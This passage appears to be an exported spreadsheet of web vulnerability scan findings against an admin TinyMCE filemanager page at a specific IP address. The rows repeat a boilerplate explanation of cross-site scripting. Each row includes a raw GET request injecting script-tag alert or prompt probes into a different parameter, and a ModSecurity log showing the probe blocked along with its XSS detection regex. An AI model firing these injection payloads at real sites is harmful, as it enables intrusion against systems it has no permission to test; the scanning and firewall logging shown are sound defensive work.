scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(260299)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=nifh02bqftvuo23pa092kf8tl1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:48</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:47 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(260299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts96wQAW0AAB7zKNYAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts96wQAW0AAB7zKNYAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366891</td><td class=xl24 width=64 >2015-03-31 21:39:43</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(169099)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=7srv5p843e1g75ian3fjbrpeg7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:50</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:48 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(169099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts@KwQAW0AAHhGMt8AAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts@KwQAW0AAHhGMt8AAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366892</td><td class=xl24 width=64 >2015-03-31 21:41:28</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=&quot;&gt;&lt;script&gt;alert(778699)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=1nt2hcen581sbmg2q41fva5ic0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:51</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:50 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(778699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts@qwQAW0AAHzDqsUAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts@qwQAW0AAHzDqsUAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366893</td><td class=xl24 width=64 >2015-03-31 21:42:13</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(790099)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=es0qg61tsf9kgbqm1ib1ggo5n2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:52</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:51 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(790099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts@6wQAW0AAHewA9UAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts@6wQAW0AAHewA9UAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366894</td><td class=xl24 width=64 >2015-03-31 21:43:13</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(157899)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=c1982670m2dka087o8dbg986i7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:53</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:52 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(157899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts-KwQAW0AABvT@HEAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts-KwQAW0AABvT@HEAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366895</td><td class=xl24 width=64 >2015-03-31 21:43:58</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&lt;script&gt;prompt(406999)&lt;/script/&gt;&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=qir90s87etgp5v36s97uruic03
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:55</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:53 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(406999)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts-awQAW0AAHhB77kAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts-awQAW0AAHhB77kAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366896</td><td class=xl24 width=64 >2015-03-31 21:44:57</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(510799)&lt;/script&gt;&lt;!--&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=k933jp5tefrvbckuqiuh2nkfh6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:56</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:55 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(510799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRts-6wQAW0AAD9hYOEAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts-6wQAW0AAD9hYOEAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366897</td><td class=xl24 width=64 >2015-03-31 21:45:42</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


